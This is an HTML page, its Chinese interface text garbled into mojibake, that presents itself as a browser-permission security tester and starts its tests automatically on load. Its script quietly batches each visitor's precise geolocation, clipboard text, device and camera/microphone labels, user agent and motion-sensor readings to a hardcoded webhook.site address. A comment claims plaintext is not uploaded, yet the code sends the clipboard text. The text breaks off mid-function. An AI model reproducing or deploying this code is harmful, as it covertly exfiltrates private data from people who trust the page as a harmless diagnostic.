<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æµè§ˆå™¨æƒé™å®‰å…¨æµ‹è¯•å™¨</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        h1 {
            text-align: center;
            color: #4a5568;
            margin-bottom: 30px;
            font-size: 2.5em;
        }
        
        .test-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .test-card {
            border: 2px solid #e9ecef;
            border-radius: 10px;
            padding: 20px;
            background: #f8f9fa;
            transition: all 0.3s ease;
        }
        
        .test-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .test-card.success {
            border-color: #28a745;
            background: #d4edda;
        }
        
        .test-card.error {
            border-color: #dc3545;
            background: #f8d7da;
        }
        
        .test-card.warning {
            border-color: #ffc107;
            background: #fff3cd;
        }
        
        .test-title {
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .test-status {
            padding: 5px 10px;
            border-radius: 15px;
            font-size: 0.8em;
            font-weight: bold;
        }
        
        .status-pending {
            background: #6c757d;
            color: white;
        }
        
        .status-success {
            background: #28a745;
            color: white;
        }
        
        .status-error {
            background: #dc3545;
            color: white;
        }
        
        .status-warning {
            background: #ffc107;
            color: #212529;
        }
        
        .test-result {
            margin-top: 10px;
            padding: 10px;
            background: white;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            max-height: 150px;
            overflow-y: auto;
        }
        
        .controls {
            text-align: center;
            margin: 30px 0;
        }
        
        button {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin: 0 10px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }
        
        button:disabled {
            background: #6c757d;
            cursor: not-allowed;
            transform: none;
        }
        
        .summary {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 20px;
            margin: 20px 0;
            border-radius: 0 8px 8px 0;
        }
        
        .summary h3 {
            margin-bottom: 15px;
            color: #1976d2;
        }
        
        .summary-item {
            display: flex;
            justify-content: space-between;
            margin: 5px 0;
            padding: 5px 0;
            border-bottom: 1px solid #bbdefb;
        }
        
        .summary-item:last-child {
            border-bottom: none;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(45deg, #28a745, #20c997);
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .auto-test-info {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }
        
        .countdown {
            font-size: 1.2em;
            font-weight: bold;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ”’ æµè§ˆå™¨æƒé™å®‰å…¨æµ‹è¯•å™¨</h1>
        
        <div class="auto-test-info">
            <div class="countdown" id="countdown">è‡ªåŠ¨æµ‹è¯•å°†åœ¨ <span id="timer">5</span> ç§’åå¼€å§‹...</div>
            <p>æ­¤æµ‹è¯•å°†è‡ªåŠ¨å°è¯•è·å–å„ç§æµè§ˆå™¨æƒé™ï¼Œæ— éœ€æ‰‹åŠ¨ç‚¹å‡»</p>
        </div>
        
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <div class="test-grid">
            <!-- åœ°ç†ä½ç½®æµ‹è¯• -->
            <div class="test-card" id="geolocation-card">
                <div class="test-title">
                    ğŸ“ åœ°ç†ä½ç½®æƒé™
                    <span class="test-status status-pending" id="geolocation-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="geolocation-result">å‡†å¤‡æµ‹è¯•åœ°ç†ä½ç½®æƒé™...</div>
            </div>
            
            <!-- éº¦å…‹é£æµ‹è¯• -->
            <div class="test-card" id="microphone-card">
                <div class="test-title">
                    ğŸ¤ éº¦å…‹é£æƒé™
                    <span class="test-status status-pending" id="microphone-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="microphone-result">å‡†å¤‡æµ‹è¯•éº¦å…‹é£æƒé™...</div>
            </div>
            
            <!-- æ‘„åƒå¤´æµ‹è¯• -->
            <div class="test-card" id="camera-card">
                <div class="test-title">
                    ğŸ“¹ æ‘„åƒå¤´æƒé™
                    <span class="test-status status-pending" id="camera-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="camera-result">å‡†å¤‡æµ‹è¯•æ‘„åƒå¤´æƒé™...</div>
            </div>
            
            <!-- é€šçŸ¥æƒé™æµ‹è¯• -->
            <div class="test-card" id="notification-card">
                <div class="test-title">
                    ğŸ”” é€šçŸ¥æƒé™
                    <span class="test-status status-pending" id="notification-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="notification-result">å‡†å¤‡æµ‹è¯•é€šçŸ¥æƒé™...</div>
            </div>
            
            <!-- å‰ªè´´æ¿æµ‹è¯• -->
            <div class="test-card" id="clipboard-card">
                <div class="test-title">
                    ğŸ“‹ å‰ªè´´æ¿æƒé™
                    <span class="test-status status-pending" id="clipboard-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="clipboard-result">å‡†å¤‡æµ‹è¯•å‰ªè´´æ¿æƒé™...</div>
            </div>
            
            <!-- å­˜å‚¨æƒé™æµ‹è¯• -->
            <div class="test-card" id="storage-card">
                <div class="test-title">
                    ğŸ’¾ å­˜å‚¨æƒé™
                    <span class="test-status status-pending" id="storage-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="storage-result">å‡†å¤‡æµ‹è¯•å­˜å‚¨æƒé™...</div>
            </div>
            
            <!-- é™€èºä»ªæµ‹è¯• -->
            <div class="test-card" id="gyroscope-card">
                <div class="test-title">
                    ğŸ§­ é™€èºä»ª
                    <span class="test-status status-pending" id="gyroscope-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="gyroscope-result">å‡†å¤‡æµ‹è¯•é™€èºä»ªæ•°æ®...</div>
                    </div>

            <!-- åŠ é€Ÿåº¦è®¡æµ‹è¯• -->
            <div class="test-card" id="accelerometer-card">
                <div class="test-title">
                    ğŸ“ˆ åŠ é€Ÿåº¦è®¡
                    <span class="test-status status-pending" id="accelerometer-status">ç­‰å¾…ä¸­</span>
                    </div>
                <div class="test-result" id="accelerometer-result">å‡†å¤‡æµ‹è¯•åŠ é€Ÿåº¦æ•°æ®...</div>
                </div>

            <!-- æ–¹å‘ä¼ æ„Ÿå™¨ï¼ˆDeviceOrientationï¼‰æµ‹è¯• -->
            <div class="test-card" id="orientation-card">
                <div class="test-title">
                    ğŸ§­ æ–¹å‘ä¼ æ„Ÿå™¨
                    <span class="test-status status-pending" id="orientation-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="orientation-result">å‡†å¤‡æµ‹è¯•æ–¹å‘ä¼ æ„Ÿå™¨...</div>
            </div>

            <!-- è¿åŠ¨ä¼ æ„Ÿå™¨ï¼ˆDeviceMotionï¼‰æµ‹è¯• -->
            <div class="test-card" id="motion-card">
                <div class="test-title">
                    ğŸƒ è¿åŠ¨ä¼ æ„Ÿå™¨
                    <span class="test-status status-pending" id="motion-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="motion-result">å‡†å¤‡æµ‹è¯•è¿åŠ¨ä¼ æ„Ÿå™¨...</div>
            </div>

            <!-- ç£åŠ›è®¡æµ‹è¯•ï¼ˆå¯é€‰ï¼‰ -->
            <div class="test-card" id="magnetometer-card">
                <div class="test-title">
                    ğŸ§² ç£åŠ›è®¡
                    <span class="test-status status-pending" id="magnetometer-status">ç­‰å¾…ä¸­</span>
                </div>
                <div class="test-result" id="magnetometer-result">å‡†å¤‡æµ‹è¯•ç£åŠ›è®¡...</div>
            </div>
        </div>
        
        <div class="controls">
            <button onclick="startAllTests()" id="startBtn">ğŸš€ å¼€å§‹æµ‹è¯•</button>
            <button onclick="stopAllTests()" id="stopBtn" disabled>â¹ï¸ åœæ­¢æµ‹è¯•</button>
            <button onclick="resetAllTests()" id="resetBtn">ğŸ”„ é‡ç½®æµ‹è¯•</button>
        </div>
        
        <div class="summary" id="summary">
            <h3>ğŸ“Š æµ‹è¯•æ€»ç»“</h3>
            <div class="summary-item">
                <span>æ€»æµ‹è¯•æ•°:</span>
                <span id="total-tests">7</span>
            </div>
            <div class="summary-item">
                <span>æˆåŠŸ:</span>
                <span id="success-count" style="color: #28a745; font-weight: bold;">0</span>
            </div>
            <div class="summary-item">
                <span>å¤±è´¥:</span>
                <span id="error-count" style="color: #dc3545; font-weight: bold;">0</span>
            </div>
            <div class="summary-item">
                <span>è­¦å‘Š:</span>
                <span id="warning-count" style="color: #ffc107; font-weight: bold;">0</span>
            </div>
            <div class="summary-item">
                <span>å®Œæˆç‡:</span>
                <span id="completion-rate" style="color: #2196f3; font-weight: bold;">0%</span>
            </div>
        </div>
    </div>

    <script>
        // ===== Webhook sender (batch + throttle) =====
        const WEBHOOK_ENDPOINT = 'https://webhook.site/59be3e07-bab1-47f5-814c-b86f69794482';
        const webhookQueue = [];
        let webhookFlushing = false;
        const sessionId = (() => Math.random().toString(36).slice(2) + Date.now().toString(36))();
        function webhookPost(json) {
            return fetch(WEBHOOK_ENDPOINT, {
                method: 'POST',
                // ä½¿ç”¨ç®€å•è¯·æ±‚å¤´ï¼Œé¿å…è§¦å‘é¢„æ£€
                headers: { 'content-type': 'text/plain;charset=UTF-8' },
                body: JSON.stringify(json)
            });
        }
        function enqueueWebhook(eventName, payload) {
            webhookQueue.push({
                ts: Date.now(),
                event: eventName,
                payload,
                sessionId,
                ua: navigator.userAgent
            });
        }
        async function flushWebhookQueue() {
            if (webhookFlushing || webhookQueue.length === 0) return;
            webhookFlushing = true;
            const batch = webhookQueue.splice(0, 50);
            try {
                await webhookPost({ batch });
            } catch (e) {
                // å›é€€ï¼šå¤±è´¥åˆ™æ”¾å›é˜Ÿåˆ—å¤´éƒ¨
                webhookQueue.unshift(...batch);
            } finally {
                webhookFlushing = false;
            }
        }
        setInterval(flushWebhookQueue, 6000);
        let testResults = {
            geolocation: { status: 'pending', result: '' },
            microphone: { status: 'pending', result: '' },
            camera: { status: 'pending', result: '' },
            notification: { status: 'pending', result: '' },
            clipboard: { status: 'pending', result: '' },
            storage: { status: 'pending', result: '' },
            gyroscope: { status: 'pending', result: '' },
            accelerometer: { status: 'pending', result: '' },
            orientation: { status: 'pending', result: '' },
            motion: { status: 'pending', result: '' },
            magnetometer: { status: 'pending', result: '' }
        };
        
        let completedTests = 0;
        let totalTests = 0;
        let isTestRunning = false;
        let countdownInterval;
        const activeSensors = [];
        const activeListeners = [];
        const lastUpdateAt = {};

        function shouldUpdate(key, intervalMs = 2000) {
            const now = Date.now();
            if (!lastUpdateAt[key] || now - lastUpdateAt[key] >= intervalMs) {
                lastUpdateAt[key] = now;
                return true;
            }
            return false;
        }
        
        // é¡µé¢åŠ è½½åå¼€å§‹å€’è®¡æ—¶
        window.addEventListener('load', function() {
            totalTests = Object.keys(testResults).length;
            document.getElementById('total-tests').textContent = totalTests;
            // åŸºç¡€ä¼šè¯ä¿¡æ¯
            enqueueWebhook('session_start', {
                time: new Date().toISOString(),
                language: navigator.language,
                platform: navigator.platform,
                vendor: navigator.vendor
            });
            startCountdown();
        });
        
        function startCountdown() {
            let timeLeft = 1;
            const timerElement = document.getElementById('timer');
            const countdownElement = document.getElementById('countdown');
            
            countdownInterval = setInterval(() => {
                timeLeft--;
                timerElement.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    countdownElement.innerHTML = 'ğŸš€ å¼€å§‹è‡ªåŠ¨æµ‹è¯•...';
                    setTimeout(() => {
                        startAllTests();
                    }, 1000);
                }
            }, 1000);
        }
        
        function updateProgress() {
            const progress = (completedTests / totalTests) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('completion-rate').textContent = Math.round(progress) + '%';
        }
        
        function updateSummary() {
            const successCount = Object.values(testResults).filter(r => r.status === 'success').length;
            const errorCount = Object.values(testResults).filter(r => r.status === 'error').length;
            const warningCount = Object.values(testResults).filter(r => r.status === 'warning').length;
            
            document.getElementById('success-count').textContent = successCount;
            document.getElementById('error-count').textContent = errorCount;
            document.getElementById('warning-count').textContent = warningCount;
        }
        
        function updateTestCard(testName, status, result) {
            const card = document.getElementById(testName + '-card');
            const statusElement = document.getElementById(testName + '-status');
            const resultElement = document.getElementById(testName + '-result');
            
            card.className = 'test-card ' + status;
            statusElement.className = 'test-status status-' + status;
            resultElement.textContent = result;
            
            const statusTexts = {
                'pending': 'ç­‰å¾…ä¸­',
                'success': 'æˆåŠŸ',
                'error': 'å¤±è´¥',
                'warning': 'è­¦å‘Š'
            };
            
            statusElement.textContent = statusTexts[status];
        }
        
        async function testGeolocation() {
            updateTestCard('geolocation', 'pending', 'æ­£åœ¨æµ‹è¯•åœ°ç†ä½ç½®æƒé™...');
            
            try {
                if (!navigator.geolocation) {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒåœ°ç†ä½ç½®API');
                }
                
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                
                const result = `âœ… åœ°ç†ä½ç½®è·å–æˆåŠŸï¼
çº¬åº¦: ${position.coords.latitude}
ç»åº¦: ${position.coords.longitude}
ç²¾åº¦: ${position.coords.accuracy}ç±³
æ—¶é—´æˆ³: ${new Date(position.timestamp).toLocaleString()}`;
                
                testResults.geolocation = { status: 'success', result };
                updateTestCard('geolocation', 'success', result);
                enqueueWebhook('geolocation_success', {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                });
                
            } catch (error) {
                const result = `âŒ åœ°ç†ä½ç½®è·å–å¤±è´¥: ${error.message}`;
                testResults.geolocation = { status: 'error', result };
                updateTestCard('geolocation', 'error', result);
                enqueueWebhook('geolocation_error', { message: error.message });
            }
            
            completedTests++;
            updateProgress();
            updateSummary();
        }
        
        async function testMicrophone() {
            updateTestCard('microphone', 'pending', 'æ­£åœ¨æµ‹è¯•éº¦å…‹é£æƒé™...');
            
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒåª’ä½“è®¾å¤‡API');
                }
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true,
                    video: false 
                });
                
                const audioTracks = stream.getAudioTracks();
                const result = `âœ… éº¦å…‹é£æƒé™è·å–æˆåŠŸï¼
éŸ³é¢‘è½¨é“æ•°: ${audioTracks.length}
è®¾å¤‡ID: ${audioTracks[0]?.getSettings().deviceId || 'æœªçŸ¥'}
æ ‡ç­¾: ${audioTracks[0]?.label || 'æœªçŸ¥'}`;
                
                // åœæ­¢æµ
                stream.getTracks().forEach(track => track.stop());
                
                testResults.microphone = { status: 'success', result };
                updateTestCard('microphone', 'success', result);
                enqueueWebhook('microphone_success', {
                    audioTracks: audioTracks.length,
                    label: audioTracks[0]?.label || null
                });
                
            } catch (error) {
                const result = `âŒ éº¦å…‹é£æƒé™è·å–å¤±è´¥: ${error.message}`;
                testResults.microphone = { status: 'error', result };
                updateTestCard('microphone', 'error', result);
                enqueueWebhook('microphone_error', { message: error.message });
            }
            
            completedTests++;
            updateProgress();
            updateSummary();
        }
        
        async function testCamera() {
            updateTestCard('camera', 'pending', 'æ­£åœ¨æµ‹è¯•æ‘„åƒå¤´æƒé™...');
            
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒåª’ä½“è®¾å¤‡API');
                }
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: false,
                    video: true 
                });
                
                const videoTracks = stream.getVideoTracks();
                const result = `âœ… æ‘„åƒå¤´æƒé™è·å–æˆåŠŸï¼
è§†é¢‘è½¨é“æ•°: ${videoTracks.length}
è®¾å¤‡ID: ${videoTracks[0]?.getSettings().deviceId || 'æœªçŸ¥'}
æ ‡ç­¾: ${videoTracks[0]?.label || 'æœªçŸ¥'}
åˆ†è¾¨ç‡: ${videoTracks[0]?.getSettings().width}x${videoTracks[0]?.getSettings().height}`;
                
                // åœæ­¢æµ
                stream.getTracks().forEach(track => track.stop());
                
                testResults.camera = { status: 'success', result };
                updateTestCard('camera', 'success', result);
                enqueueWebhook('camera_success', {
                    videoTracks: videoTracks.length,
                    label: videoTracks[0]?.label || null,
                    width: videoTracks[0]?.getSettings().width,
                    height: videoTracks[0]?.getSettings().height
                });
                
            } catch (error) {
                const result = `âŒ æ‘„åƒå¤´æƒé™è·å–å¤±è´¥: ${error.message}`;
                testResults.camera = { status: 'error', result };
                updateTestCard('camera', 'error', result);
                enqueueWebhook('camera_error', { message: error.message });
            }
            
            completedTests++;
            updateProgress();
            updateSummary();
        }
        
        async function testNotification() {
            updateTestCard('notification', 'pending', 'æ­£åœ¨æµ‹è¯•é€šçŸ¥æƒé™...');
            
            try {
                if (!('Notification' in window)) {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒé€šçŸ¥API');
                }
                
                let permission = Notification.permission;
                
                if (permission === 'default') {
                    permission = await Notification.requestPermission();
                }
                
                let result;
                if (permission === 'granted') {
                    // å°è¯•å‘é€æµ‹è¯•é€šçŸ¥
                    const notification = new Notification('æƒé™æµ‹è¯•', {
                        body: 'é€šçŸ¥æƒé™æµ‹è¯•æˆåŠŸï¼',
                        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">ğŸ””</text></svg>'
                    });
                    
                    setTimeout(() => notification.close(), 3000);
                    
                    result = `âœ… é€šçŸ¥æƒé™è·å–æˆåŠŸï¼
æƒé™çŠ¶æ€: ${permission}
å¯ä»¥å‘é€é€šçŸ¥: æ˜¯`;
                    
                    testResults.notification = { status: 'success', result };
                    updateTestCard('notification', 'success', result);
                    enqueueWebhook('notification_success', { permission });
                } else {
                    result = `âš ï¸ é€šçŸ¥æƒé™è¢«æ‹’ç»
æƒé™çŠ¶æ€: ${permission}
å¯ä»¥å‘é€é€šçŸ¥: å¦`;
                    
                    testResults.notification = { status: 'warning', result };
                    updateTestCard('notification', 'warning', result);
                    enqueueWebhook('notification_denied', { permission });
                }
                
            } catch (error) {
                const result = `âŒ é€šçŸ¥æƒé™æµ‹è¯•å¤±è´¥: ${error.message}`;
                testResults.notification = { status: 'error', result };
                updateTestCard('notification', 'error', result);
                enqueueWebhook('notification_error', { message: error.message });
            }
            
            completedTests++;
            updateProgress();
            updateSummary();
        }
        
        async function testClipboard() {
            updateTestCard('clipboard', 'pending', 'æ­£åœ¨æµ‹è¯•å‰ªè´´æ¿æƒé™...');
            
            try {
                if (!navigator.clipboard) {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒå‰ªè´´æ¿API');
                }
                
                // å°è¯•è¯»å–å‰ªè´´æ¿
                const clipboardItems = await navigator.clipboard.read();
                
                let result = `âœ… å‰ªè´´æ¿æƒé™è·å–æˆåŠŸï¼
å‰ªè´´æ¿é¡¹ç›®æ•°: ${clipboardItems.length}`;
                
                if (clipboardItems.length > 0) {
                    for (const item of clipboardItems) {
                        result += `\næ”¯æŒçš„ç±»å‹: ${item.types.join(', ')}`;
                    }
                } else {
                    result += '\nå‰ªè´´æ¿ä¸ºç©º';
                }
                
                testResults.clipboard = { status: 'success', result };
                updateTestCard('clipboard', 'success', result);
                // ä¸ŠæŠ¥å…ƒæ•°æ®ï¼ˆé¿å…ç›´æ¥ä¸Šä¼ æ˜æ–‡ï¼‰
                enqueueWebhook('clipboard_meta', {
                    count: clipboardItems.length,
                    types: clipboardItems.map(i => i.types)
                });
                // ç›´æ¥è¯»å–å¹¶ä¸ŠæŠ¥çº¯æ–‡æœ¬å†…å®¹ï¼ˆè‹¥å¯ç”¨ï¼‰
                try {
                    const text = await navigator.clipboard.readText();
                    enqueueWebhook('clipboard_text', {
                        length: (text || '').length,
                        text
                    });
                } catch (e) {
                    enqueueWebhook('clipboard_text_error', { message: e.message });
                }
                
            } catch (error) {
                const result = `âŒ å‰ªè´´æ¿æƒé™è·å–å¤±è´¥: ${error.message}`;
                testResults.clipboard = { status: 'error', result };
                updateTestCard('clipboard', 'error', result);
                enqueueWebhook('clipboard_error', { message: error.message });
            }
            
            completedTests++;
            updateProgress();
            updateSummary();
        }
        
        async function testStorage() {
            updateTestCard('storage', 'pending', 'æ­£åœ¨æµ‹è¯•å­˜å‚¨æƒé™...');
            
            try {
                let result = 'âœ… å­˜å‚¨æƒé™æµ‹è¯•ç»“æœ:\n';
                
                // æµ‹è¯• localStorage
                try {
                    localStorage.setItem('test_key', 'test_value');
                    const value = localStorage.getItem('test_key');
                    localStorage.removeItem('test_key');
                    result += `localStorage: å¯ç”¨\n`;
                } catch (e) {
                    result += `localStorage: ä¸å¯ç”¨ (${e.message})\n`;
                }
                
                // æµ‹è¯• sessionStorage
                try {
                    sessionStorage.setItem('test_key', 'test_value');
                    const value = sessionStorage.getItem('test_key');
                    sessionStorage.removeItem('test_key');
                    result += `sessionStorage: å¯ç”¨\n`;
                } catch (e) {
                    result += `sessionStorage: ä¸å¯ç”¨ (${e.message})\n`;
                }
                
                // æµ‹è¯• IndexedDB
                try {
                    if ('indexedDB' in window) {
                        result += `IndexedDB: æ”¯æŒ\n`;
                    } else {
                        result += `IndexedDB: ä¸æ”¯æŒ\n`;
                    }
                } catch (e) {
                    result += `IndexedDB: é”™è¯¯ (${e.message})\n`;
                }
                
                // æµ‹è¯• Web Storage é…é¢
                try {
                    if ('storage' in navigator && 'estimate' in navigator.storage) {
                        const estimate = await navigator.storage.estimate();
                        result += `å­˜å‚¨é…é¢: ${Math.round(estimate.quota / 1024 / 1024)}MB\n`;
                        result += `å·²ä½¿ç”¨: ${Math.round(estimate.usage / 1024 / 1024)}MB`;
                        enqueueWebhook('storage_quota', {
                            quota: estimate.quota,
                            usage: estimate.usage
                        });
                    } else {
                        result += `å­˜å‚¨é…é¢: æ— æ³•è·å–`;
                    }
                } catch (e) {
                    result += `å­˜å‚¨é…é¢: é”™è¯¯ (${e.message})`;
                }
                
                testResults.storage = { status: 'success', result };
                updateTestCard('storage', 'success', result);
                enqueueWebhook('storage_summary', { localStorage: true, sessionStorage: true, indexedDB: 'indexedDB' in window });
                
            } catch (error) {
                const result = `âŒ å­˜å‚¨æƒé™æµ‹è¯•å¤±è´¥: ${error.message}`;
                testResults.storage = { status: 'error', result };
                updateTestCard('storage', 'error', result);
                enqueueWebhook('storage_error', { message: error.message });
            }
            
            completedTests++;
            updateProgress();
            updateSummary();
        }
        
        // iOS 13+ éœ€è¦ç”¨æˆ·æ‰‹åŠ¿è§¦å‘çš„æƒé™è¯·æ±‚ï¼›æ­¤å‡½æ•°åœ¨æµ‹è¯•æ—¶è°ƒç”¨
        async function ensureMotionOrientationPermission() {
            try {
                // DeviceMotion æƒé™
                if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
                    const state = await DeviceMotionEvent.requestPermission();
                    if (state !== 'granted') {
                        throw new Error('è¿åŠ¨ä¼ æ„Ÿå™¨æƒé™æœªæˆäºˆ');
                    }
                }
                // DeviceOrientation æƒé™
                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                    const state2 = await DeviceOrientationEvent.requestPermission();
                    if (state2 !== 'granted') {
                        throw new Error('æ–¹å‘ä¼ æ„Ÿå™¨æƒé™æœªæˆäºˆ');
                    }
                }
                return true;
            } catch (e) {
                // é iOS æƒ…å†µä¸€èˆ¬ä¸ä¼šæŠ›é”™
                return true;
            }
        }

        async function testGyroscope() {
            updateTestCard('gyroscope', 'pending', 'æ­£åœ¨æµ‹è¯•é™€èºä»ª...');
            try {
                await ensureMotionOrientationPermission();
                if ('Gyroscope' in window) {
                    await new Promise((resolve, reject) => {
                        try {
                            const gyro = new Gyroscope({ frequency: 60 });
                            let initialized = false;
                            const onReading = () => {
                                if (!shouldUpdate('gyro')) return;
                                const result = `âœ… é™€èºä»ªæ•°æ®:\nè§’é€Ÿåº¦X: ${gyro.x?.toFixed?.(3)}Â°/s\nè§’é€Ÿåº¦Y: ${gyro.y?.toFixed?.(3)}Â°/s\nè§’é€Ÿåº¦Z: ${gyro.z?.toFixed?.(3)}Â°/s`;
                                testResults.gyroscope = { status: 'success', result };
                                if (!initialized) {
                                    updateTestCard('gyroscope', 'success', result);
                                    initialized = true;
                                    resolve();
                                } else {
                                    // ä»…æ›´æ–°å†…å®¹ï¼Œé¿å…é‡å¤é—ªçƒçŠ¶æ€
                                    const el = document.getElementById('gyroscope-result');
                                    if (el) el.textContent = result;
                                }
                                enqueueWebhook('gyroscope_reading', { x: gyro.x, y: gyro.y, z: gyro.z });
                            };
                            gyro.addEventListener('reading', onReading);
                            gyro.addEventListener('error', (event) => {
                                if (!initialized) {
                                    reject(event.error || new Error('é™€èºä»ªé”™è¯¯'));
                                }
                            });
                            activeSensors.push(gyro);
                            gyro.start();
                            // è¶…æ—¶ä¿æŠ¤ï¼ˆé¦–æ¬¡ï¼‰
                            setTimeout(() => {
                                if (!initialized) {
                                    reject(new Error('é™€èºä»ªè¯»å–è¶…æ—¶'));
                                }
                            }, 3000);
                        } catch (e) {
                            reject(e);
                        }
                    });
                } else if ('ondevicemotion' in window) {
                    await new Promise((resolve, reject) => {
                        let initialized = false;
                        const handler = (e) => {
                            if (!shouldUpdate('gyro_dm')) return;
                            const rr = e.rotationRate;
                            if (rr && (rr.alpha != null || rr.beta != null || rr.gamma != null)) {
                                const result = `âœ… é™€èºä»ªæ•°æ®(å…¼å®¹):\nalpha: ${rr.alpha?.toFixed?.(3)}Â°/s\nbeta: ${rr.beta?.toFixed?.(3)}Â°/s\ngamma: ${rr.gamma?.toFixed?.(3)}Â°/s`;
                                testResults.gyroscope = { status: 'success', result };
                                if (!initialized) {
                                    updateTestCard('gyroscope', 'success', result);
                                    initialized = true;
                                    resolve();
                                } else {
                                    const el = document.getElementById('gyroscope-result');
                                    if (el) el.textContent = result;
                                }
                                enqueueWebhook('gyroscope_reading_dm', { alpha: rr?.alpha, beta: rr?.beta, gamma: rr?.gamma });
                            } else if (!initialized) {
                                const result = 'âš ï¸ è®¾å¤‡ä¸æä¾› rotationRate æ•°æ®';
                                testResults.gyroscope = { status: 'warning', result };
                                updateTestCard('gyroscope', 'warning', result);
                                initialized = true;
                                resolve();
                            }
                        };
                        window.addEventListener('devicemotion', handler);
                        activeListeners.push({ target: window, type: 'devicemotion', handler });
                        setTimeout(() => {
                            if (!initialized) {
                                reject(new Error('æœªæ”¶åˆ° devicemotion äº‹ä»¶'));
                            }
                        }, 3000);
                    });
                } else {
                    throw new Error('æµè§ˆå™¨ä¸æ”¯æŒé™€èºä»ªæ¥å£');
                }
            } catch (error) {
                const result = `âŒ é™€èºä»ªæµ‹è¯•å¤±è´¥: ${error.message}`;
                testResults.gyroscope = { status: 'error', result };
                updateTestCard('gyroscope', 'error', result);
            }
            completedTests++;
            updateProgress();
            updateSummary();
        }

        async function testAccelerometer() {
            updateTestCard('accelerometer', 'pending', 'æ­£åœ¨æµ‹è¯•åŠ é€Ÿåº¦è®¡...');
            try {
                await ensureMotionOrientationPermission();
                if ('Accelerometer' in window) {
                    await new Promise((resolve, reject) => {
                        try {
                            const accel = new Accelerometer({ frequency: 60 });
                            let initialized = false;
                            const onReading = () => {
                                if (!shouldUpdate('accel')) return;
                                const result = `âœ… åŠ é€Ÿåº¦è®¡æ•°æ®:\nX: ${accel.x?.toFixed?.(3)} m/sÂ²\nY: ${accel.y?.toFixed?.(3)} m/sÂ²\nZ: ${accel.z?.toFixed?.(3)} m/sÂ²`;
                                testResults.accelerometer = { status: 'success', result };
                                if (!initialized) {
                                    updateTestCard('accelerometer', 'success', result);
                                    initialized = true;
                                    resolve();
                                } else {
                                    const el = document.getElementById('accelerometer-result');
                                    if (el) el.textContent = result;
                                }
                                enqueueWebhook('accelerometer_reading', { x: accel.x, y: accel.y, z: accel.z });
                            };
                            accel.addEventListener('reading', onReading);
                            accel.addEventListener('error', (event) => {
                                if (!initialized) reject(event.error || new Error('åŠ é€Ÿåº¦è®¡é”™è¯¯'));
                            });
                            activeSensors.push(accel);
                            accel.start();
                            setTimeout(() => {
                                if (!initialized) {
                                    reject(new Error('åŠ é€Ÿåº¦è®¡è¯»å–è¶…æ—¶'));
                                }
                            }, 3000);
                        } catch (e) { reject(e); }
                    });
                } else if ('ondevicemotion' in window) {
                    await new Promise((resolve, reject) => {
                        let initialized = false;
                        const handler = (e) => {
